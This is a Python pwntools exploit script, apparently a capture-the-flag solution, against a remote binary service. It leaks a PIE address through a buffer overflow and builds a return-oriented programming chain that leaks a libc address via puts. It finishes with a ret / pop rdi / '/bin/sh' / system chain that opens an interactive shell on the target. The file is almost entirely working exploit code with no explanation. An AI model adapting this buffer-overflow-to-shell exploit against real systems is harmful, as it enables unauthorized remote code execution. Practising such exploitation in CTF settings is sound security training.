from pwn import *
context.terminal = ["terminator", "-e"]

#p = process("./chall_online")
p = remote("35.205.32.55", 1337)
elf = context.binary = ELF("./chall_online", checksec=False)

print(p.recvuntil(b"nom ?"))
p.sendline(b"A"*16+b"\x70")

print(p.recvuntil(b"A"*16))
leak = p.recv(6)
leak = int.from_bytes(leak, "little")
print(hex(leak))
elf.address = leak - 0x1266
print(hex(elf.address))

basePIE = leak - 0x1266
print(p.recvuntil(b"..."))
p.sendline(b"2")
print(p.recvuntil(b"vous ?"))
p.sendline(b"2")
print(p.recvuntil(b"..."))

p.sendline(b"2")
print(p.recvuntil(b"vous ?"))
p.sendline(b"2")
print(p.recvuntil(b"..."))

p.sendline(b"2")
print(p.recvuntil(b"vous ?"))
p.sendline(b"2")


print(p.recvuntil(b"..."))
print(p.recvuntil(b"..."))

p.sendline(b"3")

print(p.recvuntil(b"rage ?"))


RET = basePIE + 0x0000000000001016
POP_RDI = basePIE + 0x000000000000170b

# rop = ROP(elf)
# rop.puts(elf.got.puts)
# rop.chest()
chest = basePIE + 0x144c
# print(hex(chest))

rop = ROP(elf)
rop.puts(elf.got.puts)


# p.sendline(b"A"*280+rop.chain()+p64(chest))
p.sendline(b"A"*264+rop.chain()+p64(chest))
print(p.recvuntil("lointain ...\n\n"))
leak = p.recv(6)
print("~~~~~~~~~~~~~~~~")
leak = int.from_bytes(leak,"little")


#base = leak - 0x72c10
base = leak - 	0x80ed0
print(hex(leak))


#system = base + 0x49990
system = base + 	0x50d60
#binsh = base + 0x19704f
binsh = base + 	0x1d8698

print(p.recvuntil(b"rage ?\n\n"))

p.sendline(b"A"*264+p64(RET)+p64(POP_RDI)+p64(binsh)+p64(system))
p.interactive()

